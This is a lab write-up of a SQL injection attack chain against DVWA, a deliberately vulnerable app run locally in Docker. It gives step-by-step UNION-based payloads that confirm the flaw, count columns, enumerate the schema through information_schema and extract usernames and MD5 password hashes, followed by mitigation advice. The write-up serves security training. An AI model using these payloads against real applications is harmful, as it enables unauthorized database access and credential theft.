\# SQL Injection Attack — DVWA (Low Security)



\## Overview

A hands-on demonstration of SQL Injection attack against DVWA

(Damn Vulnerable Web App), performed locally in a Docker sandbox. This

project walks through the full attack chain, from confirming the

vulnerability to extracting live database credentials. I used the

application's built-in "User ID" search field.



\## Environment

\- DVWA (`vulnerables/web-dvwa`) running locally via Docker

\- Security level: Low

\- Database: MariaDB 10.1.26



\## What is SQL Injection?

The application builds a database query by directly inserting raw user

input into a SQL statement, without validating or sanitizing it. Because

of this, a specially crafted input can change the \*meaning\* of the query

itself rather than just supplying a value — allowing an attacker to

manipulate what data the database returns.



\## Attack Walkthrough



\### 1. Confirming the vulnerability

Input: `1' OR '1'='1`

Result: returned all 5 users instead of just one, confirming the input

is inserted directly into the SQL query with no sanitization.

!\[confirm vulnerable](screenshots/check\_unsanitized.png)



\### 2. Determining column count

Used `1' ORDER BY 1-- -`, `2`, `3` to find the query breaks at column 3

→ confirms the underlying query returns 2 columns.

!\[column count](screenshots/Column.png)



\### 3. Confirming UNION injection

Input: `1' UNION SELECT 1,2-- -`

The literal values 1 and 2 were reflected back on the page, confirming

a working UNION-based injection point.

!\[union confirm 1](screenshots/column\_1.png)

!\[union confirm 2](screenshots/column\_2.png)



\### 4. Database recon

Input: `1' UNION SELECT database(), @@version-- -`

Revealed the database name (`dvwa`) and server version

(MariaDB 10.1.26).

!\[db recon](screenshots/database\_and\_version.png)



\### 5. Enumerating tables and columns

Input: `1' UNION SELECT table\_name, null FROM information\_schema.tables WHERE table\_schema=database()-- -`

Found two tables: `guestbook` and `users`.



Input: `1' UNION SELECT column\_name, null FROM information\_schema.columns WHERE table\_name='users'-- -`

Mapped the full structure of the `users` table: `user\_id`, `first\_name`,

`last\_name`, `user`, `password`, `avatar`, `last\_login`, `failed\_login`.

!\[schema enum](screenshots/info\_schema.png)

!\[columns](screenshots/columns.png)



\### 6. Extracting credentials

Input: `1' UNION SELECT user, password FROM users-- -`

Retrieved all 5 usernames and their MD5 password hashes.

!\[credentials](screenshots/credentials.png)



\## Impact

This attack chain demonstrates that an unauthenticated user could fully

enumerate the database schema and extract every stored user credential

using only the application's search field — no additional tools required.



\## Mitigation

\- Use parameterized queries / prepared statements instead of concatenating

&#x20; user input into SQL strings

\- Apply least-privilege database accounts (the web app shouldn't need

&#x20; access to `information\_schema`)

\- Never store passwords as unencypted MD5 — use a modern algorithm like

&#x20; bcrypt or Argon2

\- Input validation as a defense-in-depth layer (not a substitute for

&#x20; parameterized queries)





